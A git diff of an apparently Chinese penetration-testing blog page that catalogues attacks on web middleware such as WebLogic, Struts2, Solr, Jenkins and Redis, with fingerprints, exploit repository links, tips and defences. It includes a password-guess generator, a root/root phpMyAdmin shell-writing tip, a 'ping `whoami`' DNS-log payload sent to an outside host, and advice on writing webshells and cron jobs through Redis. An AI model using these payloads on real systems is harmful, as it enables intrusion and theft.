 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">prefix = ['baidu', 'Baidu']</span><br><span class="line">for x in [''.join(x) for x in list(itertools.product(prefix, ['@', ''], ['2019', '2020', '2018', '123', '1234', '123456'], ['!', '', '.']))] : print(x)</span><br><span class="line"></span><br><span class="line">baidu@2019!</span><br><span class="line">baidu@2019</span><br><span class="line">baidu@2019.</span><br><span class="line">baidu@2020!</span><br><span class="line">baidu@2020</span><br><span class="line">.........</span><br><span class="line">Baidu123456</span><br><span class="line">Baidu123456.</span><br></pre></td></tr></tbody></table></figure>
 
@@ -720,8 +720,8 @@
 
 <p><strong>5. 漏洞分析</strong><br>Coremail-0day敏感文件泄露漏洞送附批量检测脚本_数据库_god_Zeo的博客-CSDN博客<br><a href="https://blog.csdn.net/god_zzZ/article/details/92735189" target="_blank" rel="noopener">https://blog.csdn.net/god_zzZ/article/details/92735189</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>yuxiaoyou123/coremail-exp<br><a href="https://github.com/yuxiaoyou123/coremail-exp">https://github.com/yuxiaoyou123/coremail-exp</a></p>
-<p>dpu/coremail-address-book: Coremail邮件系统组织通讯录导出脚本<br><a href="https://github.com/dpu/coremail-address-book">https://github.com/dpu/coremail-address-book</a></p>
+<p>yuxiaoyou123/coremail-exp<br><a href="https://github.com/yuxiaoyou123/coremail-exp" target="_blank" rel="noopener">https://github.com/yuxiaoyou123/coremail-exp</a></p>
+<p>dpu/coremail-address-book: Coremail邮件系统组织通讯录导出脚本<br><a href="https://github.com/dpu/coremail-address-book" target="_blank" rel="noopener">https://github.com/dpu/coremail-address-book</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.这个找不到源码, 没法分析</p>
 <p>里面的密码也多半没啥用, 还不如邮件里搜索一下vpn/密码</p>
@@ -812,9 +812,9 @@
 <p>ThinkPHP使用不当可能造成敏感信息泄露<em>PHP_Fly</em>鹏程万里-CSDN博客<br><a href="https://blog.csdn.net/Fly_hps/article/details/81201904" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/81201904</a></p>
 <p>DSMall代码审计 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/203461" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203461</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合<br><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p>
-<p>Dido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写<br><a href="https://github.com/Dido1960/thinkphp">https://github.com/Dido1960/thinkphp</a></p>
-<p>whirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具<br><a href="https://github.com/whirlwind110/tphack">https://github.com/whirlwind110/tphack</a></p>
+<p>SkyBlueEternal/thinkphp-RCE-POC-Collection: thinkphp v5.x 远程代码执行漏洞-POC集合<br><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" target="_blank" rel="noopener">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p>
+<p>Dido1960/thinkphp: thinkphp反序列化漏洞复现及POC编写<br><a href="https://github.com/Dido1960/thinkphp" target="_blank" rel="noopener">https://github.com/Dido1960/thinkphp</a></p>
+<p>whirlwind110/tphack: Thinkphp3/5 Log文件泄漏利用工具<br><a href="https://github.com/whirlwind110/tphack" target="_blank" rel="noopener">https://github.com/whirlwind110/tphack</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.遇到Thinkphp的站点看一下版本, 或者直接扫一下, 看看有没有rce, 或者日志文件泄露</p>
 <p>2.自从我挖了thinphp的反序列化利用链以后, 这类型考题经常出没在ctf中</p>
@@ -838,8 +838,8 @@
 <p>Exploiting Spring Boot Actuators | Veracode blog<br><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></p>
 <p>Spring Boot Actuators配置不当导致RCE漏洞复现 – JF ‘ blog<br>[<a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/]" target="_blank" rel="noopener">https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/]</a>(<a href="https://jianfensec.com/漏洞复现/Spring" target="_blank" rel="noopener">https://jianfensec.com/漏洞复现/Spring</a> Boot Actuators配置不当导致RCE漏洞复现/)</p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE<br><a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a></p>
-<p>artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads<br><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p>
+<p>mpgn/Spring-Boot-Actuator-Exploit: Spring Boot Actuator (jolokia) XXE/RCE<br><a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit" target="_blank" rel="noopener">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a></p>
+<p>artsploit/yaml-payload: A tiny project for generating SnakeYAML deserialization payloads<br><a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.Spring Boot Actuators 相关漏洞超级好用</p>
 <p>很多厂商一开始都不懂, 直接对外开放<code>Spring Boot Actuators</code>, 造成了有一段时间每个用了<code>Spring Boot</code>的厂商都出了问题</p>
@@ -874,7 +874,7 @@
 <p><strong>5. 漏洞分析</strong></p>
 <p>PhpStudy 后门分析<br><a href="https://paper.seebug.org/1044/" target="_blank" rel="noopener">https://paper.seebug.org/1044/</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>NS-Sp4ce/PHPStudy_BackDoor_Exp: PHPStudy_BackDoor_EXP PHPstudy后门利用脚本<br><a href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp">https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p>
+<p>NS-Sp4ce/PHPStudy_BackDoor_Exp: PHPStudy_BackDoor_EXP PHPstudy后门利用脚本<br><a href="https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.phpstudy 根目录下面有个<code>l.php</code> , 里面有探针, 可以作为判断条件</p>
 <p>2.还有个<code>/phpmyadmin</code>目录, 一般密码都是<code>root/root</code> 后台<code>mysql outfile</code> 写 shell 就ok了</p>
@@ -888,14 +888,14 @@
 <p><strong>3. 漏洞指纹</strong></p>
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Struts</span><br><span class="line">.action</span><br><span class="line">.do</span><br><span class="line">.action!xxxx</span><br></pre></td></tr></tbody></table></figure>
 
-<p>struts2_check/struts2_hunt_v2.py at master · coffeehb/struts2_check<br><a href="https://github.com/coffeehb/struts2_check/">https://github.com/coffeehb/struts2_check/</a></p>
+<p>struts2_check/struts2_hunt_v2.py at master · coffeehb/struts2_check<br><a href="https://github.com/coffeehb/struts2_check/" target="_blank" rel="noopener">https://github.com/coffeehb/struts2_check/</a></p>
 <p><strong>4. Fofa Dork</strong></p>
 <p><code>app="Struts2"</code> (这个不太准)</p>
 <p><strong>5. 漏洞分析</strong></p>
 <p>Struts2代码执行漏洞整理 – 简书<br><a href="https://www.jianshu.com/p/d7cd8a2a992b" target="_blank" rel="noopener">https://www.jianshu.com/p/d7cd8a2a992b</a></p>
 <p><strong>6. 漏洞利用</strong></p>
 <p>struts-scan/struts-scan.py at master · Lucifer1993/struts-scan</p>
-<p><a href="https://github.com/Lucifer1993/struts-scan/">https://github.com/Lucifer1993/struts-scan/</a></p>
+<p><a href="https://github.com/Lucifer1993/struts-scan/" target="_blank" rel="noopener">https://github.com/Lucifer1993/struts-scan/</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.Struts 的漏洞(比如016, 032)经常可以用于ssrf打内网, 说不好就有惊喜</p>
 <p><strong>8. 防护方法</strong></p>
@@ -915,9 +915,9 @@
 <p>Apache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/218730.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218730.html</a></p>
 <p>Apache Solr DataImportHandler 远程代码执行漏洞(CVE-2019-0193) 分析<br><a href="https://paper.seebug.org/1009/" target="_blank" rel="noopener">https://paper.seebug.org/1009/</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>veracode-research/solr-injection: Apache Solr Injection Research<br><a href="https://github.com/veracode-research/solr-injection">https://github.com/veracode-research/solr-injection</a></p>
-<p>jas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)<br><a href="https://github.com/jas502n/CVE-2019-12409">https://github.com/jas502n/CVE-2019-12409</a></p>
-<p>mogwailabs/mjet: MOGWAI LABS JMX exploitation toolkit<br><a href="https://github.com/mogwailabs/mjet">https://github.com/mogwailabs/mjet</a></p>
+<p>veracode-research/solr-injection: Apache Solr Injection Research<br><a href="https://github.com/veracode-research/solr-injection" target="_blank" rel="noopener">https://github.com/veracode-research/solr-injection</a></p>
+<p>jas502n/CVE-2019-12409: Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)<br><a href="https://github.com/jas502n/CVE-2019-12409" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-12409</a></p>
+<p>mogwailabs/mjet: MOGWAI LABS JMX exploitation toolkit<br><a href="https://github.com/mogwailabs/mjet" target="_blank" rel="noopener">https://github.com/mogwailabs/mjet</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.看到锤就完事了, 漏洞太多了, 一片一片的</p>
 <p>2.遇到<code>mjet</code>连接超时, 这是目标服务起返回了错误的stub(内网地址, 常见于docker), 可以使用<code>socat</code>进行流量转发, 后记里面有具体操作</p>
@@ -940,7 +940,7 @@
 <p><strong>5. 漏洞分析</strong></p>
 <p>Apache Tomcat AJP协议文件包含漏洞分析 – 斗象能力中心<br><a href="https://blog.riskivy.com/apache-tomcat-ajp协议文件包含漏洞分析/" target="_blank" rel="noopener">https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>0nise/CVE-2020-1938: CVE-2020-1938<br><a href="https://github.com/0nise/CVE-2020-1938">https://github.com/0nise/CVE-2020-1938</a></p>
+<p>0nise/CVE-2020-1938: CVE-2020-1938<br><a href="https://github.com/0nise/CVE-2020-1938" target="_blank" rel="noopener">https://github.com/0nise/CVE-2020-1938</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.当时还没公开poc的时候就分析出来exp挺有意思的, 效果确实还可以, 当天fofa都被累挂了</p>
 <p>主要代码也就这</p>
@@ -963,11 +963,11 @@
 <p><strong>5. 漏洞分析</strong></p>
 <p>PHP-fpm 远程代码执行漏洞(CVE-2019-11043)分析<br><a href="https://paper.seebug.org/1063/" target="_blank" rel="noopener">https://paper.seebug.org/1063/</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>neex/phuip-fpizdam: Exploit for CVE-2019-11043<br><a href="https://github.com/neex/phuip-fpizdam">https://github.com/neex/phuip-fpizdam</a></p>
-<p>jas502n/CVE-2019-11043: php-fpm+Nginx RCE<br><a href="https://github.com/jas502n/CVE-2019-11043">https://github.com/jas502n/CVE-2019-11043</a></p>
+<p>neex/phuip-fpizdam: Exploit for CVE-2019-11043<br><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a></p>
+<p>jas502n/CVE-2019-11043: php-fpm+Nginx RCE<br><a href="https://github.com/jas502n/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-11043</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.这个漏洞检测没有特别稳定的方案, 目前可以参考k8的检测方案, 通过递增发送payload检测服务器502</p>
-<p>k8gege/CVE-2019-11043: Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix)<br><a href="https://github.com/k8gege/CVE-2019-11043">https://github.com/k8gege/CVE-2019-11043</a></p>
+<p>k8gege/CVE-2019-11043: Ladon POC Moudle CVE-2019-11043 (PHP-FPM + Ngnix)<br><a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a></p>
 <p>2.Nextcloud 这个应用的默认配置就存在漏洞</p>
 <p><strong>8. 防护方法</strong></p>
 <p>1.升级到最新版php</p>
@@ -988,7 +988,7 @@
 <p><a href="https://blog.riskivy.com/atlassian-confluence-rce-cve-2019-3396/" target="_blank" rel="noopener">Atlassian Confluence 远程代码执行漏洞分析</a></p>
 </blockquote>
 <p><strong>6. 漏洞利用</strong></p>
-<p>jas502n/CVE-2019-3396: Confluence 未授权 RCE (CVE-2019-3396) 漏洞<br><a href="https://github.com/jas502n/CVE-2019-3396">https://github.com/jas502n/CVE-2019-3396</a></p>
+<p>jas502n/CVE-2019-3396: Confluence 未授权 RCE (CVE-2019-3396) 漏洞<br><a href="https://github.com/jas502n/CVE-2019-3396" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-3396</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.本地写日志的方式getshell</p>
 <p>这个漏洞挺有意思的, 在国内没公开的时候, 我们就监测到了, 然后也写出了exp, 奈何没几天就曝光了</p>
@@ -1017,7 +1017,7 @@
 <p>ghostscript命令执行漏洞预警 – 安全客, 安全资讯平台<br><a href="https://www.anquanke.com/post/id/157513" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157513</a></p>
 <p><strong>6. 漏洞利用</strong></p>
 <p>Exploit Database Search<br><a href="https://www.exploit-db.com/search?q=Ghostscript" target="_blank" rel="noopener">https://www.exploit-db.com/search?q=Ghostscript</a></p>
-<p>vulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhub<br><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116">https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p>
+<p>vulhub/ghostscript/CVE-2019-6116 at master · vulhub/vulhub<br><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行</p>
 <p>dnslog 可以用 <code>ping</code>uname<code>.admin.ceye.io</code> 或 <code>ping</code>whoami<code>.admin.ceye.io</code></p>
@@ -1040,8 +1040,8 @@
 <p><strong>5. 漏洞分析</strong></p>
 <p>打开JBoss的潘多拉魔盒:JBoss高危漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/186948.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/186948.html</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool<br><a href="https://github.com/joaomatosf/jexboss">https://github.com/joaomatosf/jexboss</a></p>
-<p>Perun/vuln/jboss at master · WyAtu/Perun<br><a href="https://github.com/WyAtu/Perun/tree/master/vuln/jboss">https://github.com/WyAtu/Perun/tree/master/vuln/jboss</a></p>
+<p>joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool<br><a href="https://github.com/joaomatosf/jexboss" target="_blank" rel="noopener">https://github.com/joaomatosf/jexboss</a></p>
+<p>Perun/vuln/jboss at master · WyAtu/Perun<br><a href="https://github.com/WyAtu/Perun/tree/master/vuln/jboss" target="_blank" rel="noopener">https://github.com/WyAtu/Perun/tree/master/vuln/jboss</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.Jboss的漏洞在内网还是相对比较常见的, 试过几次<code>jexboss</code>, 效果还ok</p>
 <p><strong>8. 防护方法</strong></p>
@@ -1064,7 +1064,7 @@
 <p>What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.<br><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere" target="_blank" rel="noopener">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#websphere</a></p>
 <p>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区<br><a href="https://xz.aliyun.com/t/6394" target="_blank" rel="noopener">https://xz.aliyun.com/t/6394</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>java-deserialization-exploits/websphere_rce.py at master · Coalfire-Research/java-deserialization-exploits<br><a href="https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py">https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py</a></p>
+<p>java-deserialization-exploits/websphere_rce.py at master · Coalfire-Research/java-deserialization-exploits<br><a href="https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py" target="_blank" rel="noopener">https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py</a></p>
 <p>Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) – 先知社区<br><a href="https://xz.aliyun.com/t/6394" target="_blank" rel="noopener">https://xz.aliyun.com/t/6394</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.Java 类的 web 容器 getshell 方法都差不多, 弱口令进后台部署 war, 或者反序列化, 文件上传之类的</p>
@@ -1089,9 +1089,9 @@
 <p>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins漏洞集合复现/" target="_blank" rel="noopener">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p>
 <p><strong>6. 漏洞利用</strong></p>
 <p>Jenkins漏洞集合复现 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/03/Jenkins漏洞集合复现/" target="_blank" rel="noopener">https://misakikata.github.io/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/</a></p>
-<p>blackye/Jenkins: Jenkins漏洞探测、用户抓取爆破<br><a href="https://github.com/blackye/Jenkins">https://github.com/blackye/Jenkins</a></p>
+<p>blackye/Jenkins: Jenkins漏洞探测、用户抓取爆破<br><a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a></p>
 <p>gquere/pwn_jenkins: Notes about attacking Jenkins servers</p>
-<p><a href="https://github.com/gquere/pwn_jenkins">https://github.com/gquere/pwn_jenkins</a></p>
+<p><a href="https://github.com/gquere/pwn_jenkins" target="_blank" rel="noopener">https://github.com/gquere/pwn_jenkins</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.Jenkins 也是收集内网信息的好地方, 获取的账号通常也是开发/运维级别的, 权限相对较大</p>
 <p><strong>8. 防护方法</strong></p>
@@ -1142,14 +1142,14 @@
 <p>CVE-2020-2555(Oracle Coherence)<br><a href="https://paper.seebug.org/1141/" target="_blank" rel="noopener">https://paper.seebug.org/1141/</a></p>
 <p>除此之外, 还有最近Oracle 2020年4月安全通告中的CVE-2020-2801, CVE-2020-2883, CVE-2020-2884, CVE-2020-2915(Oracle Coherence)等漏洞.<br><a href="https://www.oracle.com/security-alerts/cpuapr2020.html" target="_blank" rel="noopener">https://www.oracle.com/security-alerts/cpuapr2020.html</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>weblogic 漏洞扫描工具<br><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p>
-<p>CVE-2020-2555<br><a href="https://github.com/Y4er/CVE-2020-2555">https://github.com/Y4er/CVE-2020-2555</a></p>
+<p>weblogic 漏洞扫描工具<br><a href="https://github.com/0xn0ne/weblogicScanner" target="_blank" rel="noopener">https://github.com/0xn0ne/weblogicScanner</a></p>
+<p>CVE-2020-2555<br><a href="https://github.com/Y4er/CVE-2020-2555" target="_blank" rel="noopener">https://github.com/Y4er/CVE-2020-2555</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.T3 协议通常开放在内网, 外网基本绝迹, 快速检测可以使用nmap</p>
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script=weblogic-t3-info.nse -p 7001</span><br></pre></td></tr></tbody></table></figure>
 
 <p>2.内网使用最新的利用链即可, weblogic也支持TLS加密的t3s, 可以使用</p>
-<p>Bort-Millipede/WLT3Serial: Native Java-based deserialization exploit for WebLogic T3 (and T3S) listeners.<br><a href="https://github.com/Bort-Millipede/WLT3Serial">https://github.com/Bort-Millipede/WLT3Serial</a></p>
+<p>Bort-Millipede/WLT3Serial: Native Java-based deserialization exploit for WebLogic T3 (and T3S) listeners.<br><a href="https://github.com/Bort-Millipede/WLT3Serial" target="_blank" rel="noopener">https://github.com/Bort-Millipede/WLT3Serial</a></p>
 <p><strong>8. 防护方法</strong></p>
 <p>1.及时更新补丁<br>2.禁用T3协议<br>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源</p>
 <h2 id="Weblogic-XMLDecoder反序列化"><a href="#Weblogic-XMLDecoder反序列化" class="headerlink" title="Weblogic XMLDecoder反序列化"></a>Weblogic XMLDecoder反序列化</h2><p><strong>1. 漏洞简介</strong></p>
@@ -1167,7 +1167,7 @@
 <p><strong>5. 漏洞分析</strong></p>
 <p>（CVE-2017-3506 &amp;CVE-2017-10271）<br>[<a href="http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/]" target="_blank" rel="noopener">http://xxlegend.com/2017/12/23/Weblogic%20XMLDecoder%20RCE%E5%88%86%E6%9E%90/]</a>(<a href="http://xxlegend.com/2017/12/23/Weblogic" target="_blank" rel="noopener">http://xxlegend.com/2017/12/23/Weblogic</a> XMLDecoder RCE分析/)</p>
 <p>CVE-2019-2725<br><a href="https://paper.seebug.org/909/" target="_blank" rel="noopener">https://paper.seebug.org/909/</a></p>
-<p><strong>6. 漏洞利用</strong><br>weblogicScanner<br><a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a></p>
+<p><strong>6. 漏洞利用</strong><br>weblogicScanner<br><a href="https://github.com/0xn0ne/weblogicScanner" target="_blank" rel="noopener">https://github.com/0xn0ne/weblogicScanner</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.由于nginx转发问题, 尝试这种路径, 可能有惊喜</p>
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/../wls-wsat/CoordinatorPortType11`</span><br><span class="line">`/../_async/AsyncResponseService</span><br></pre></td></tr></tbody></table></figure>
@@ -1194,7 +1194,7 @@
 <p><strong>5. 漏洞分析</strong></p>
 <p>WebLogic CVE-2020-2551漏洞分析<br><a href="https://paper.seebug.org/1138/" target="_blank" rel="noopener">https://paper.seebug.org/1138/</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>Y4er/CVE-2020-2551: Weblogic IIOP CVE-2020-2551<br><a href="https://github.com/Y4er/CVE-2020-2551">https://github.com/Y4er/CVE-2020-2551</a></p>
+<p>Y4er/CVE-2020-2551: Weblogic IIOP CVE-2020-2551<br><a href="https://github.com/Y4er/CVE-2020-2551" target="_blank" rel="noopener">https://github.com/Y4er/CVE-2020-2551</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>漫谈WebLogic CVE-2020-2551 – 安全客，安全资讯平台<br><a href="https://www.anquanke.com/post/id/201005" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201005</a></p>
 <p><strong>8. 防护方法</strong></p>
@@ -1213,7 +1213,7 @@
 <p><strong>5. 漏洞分析</strong></p>
 <p>Redis 基于主从复制的 RCE 利用方式<br><a href="https://paper.seebug.org/975/" target="_blank" rel="noopener">https://paper.seebug.org/975/</a></p>
 <p><strong>6. 漏洞利用</strong></p>
-<p>n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules!<br><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
+<p>n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules!<br><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
 <p><strong>7. 利用技巧</strong></p>
 <p>1.当Redis 权限满足写文件时</p>
 <p>linux 写计划任务, windows写启动目录, 如果可以都写web目录的webshell</p>
@@ -1255,7 +1255,7 @@
 <p>linux下java反序列化通杀回显方法的低配版实现 – 先知社区<br><a href="https://xz.aliyun.com/t/7307" target="_blank" rel="noopener">https://xz.aliyun.com/t/7307</a></p>
 <p>照弹不误:出站端口受限环境下反弹Shell的思考 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/232544.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/232544.html</a></p>
 <p>如何绕过高版本JDK限制进行JNDI注入利用<br><a href="https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA</a></p>
-<p>JosephTribbianni/JNDI: JNDI 注入利用工具<br><a href="https://github.com/JosephTribbianni/JNDI">https://github.com/JosephTribbianni/JNDI</a></p>
+<p>JosephTribbianni/JNDI: JNDI 注入利用工具<br><a href="https://github.com/JosephTribbianni/JNDI" target="_blank" rel="noopener">https://github.com/JosephTribbianni/JNDI</a></p>
 <p>7.永远相信弱口令的力量, 文中没有提到的 mysql, mssql, rdp, ssh, docker-api, 大数据平台相关组件或者更多常见不常见服务, 很多都是弱口令/未授权一把梭的问题<br>最后祝大家 <strong>开局有0day, 处处弱口令</strong></p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -1338,7 +1338,7 @@
 
 <script>
   (function () {
-    var url = 'http://github.com/4c5a59/4c5a59.github.io/2020/07/08/斗象科技-武器库/';
+    var url = 'http://yoursite.com/2020/07/08/斗象科技-武器库/';
     var banner = ''
     if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
       $('#article-banner').css({
